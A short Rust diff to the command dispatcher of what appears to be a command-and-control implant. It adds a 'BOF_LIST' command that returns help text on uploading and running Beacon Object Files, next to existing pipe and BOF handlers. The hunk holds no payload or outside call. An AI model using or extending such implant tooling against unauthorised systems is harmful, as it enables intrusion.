@@ -1754,6 +1754,12 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
             #[cfg(not(target_os = "windows"))]
             t.send_result(task.id, "", "PIPE_STOP: not supported on this platform");
         }
+        "BOF_LIST" => {
+            t.send_result(task.id,
+                "BOF execution supported. Upload a .coff/.o file with 'upload', then run with 'bof <filename>'.\nSupported arg types: z (string), i (int32), s (int16), b (bool/byte), Z (wstring), B (binary blob).",
+                "");
+        }
+
         "BOF" => {
             #[cfg(target_os = "windows")]
             {
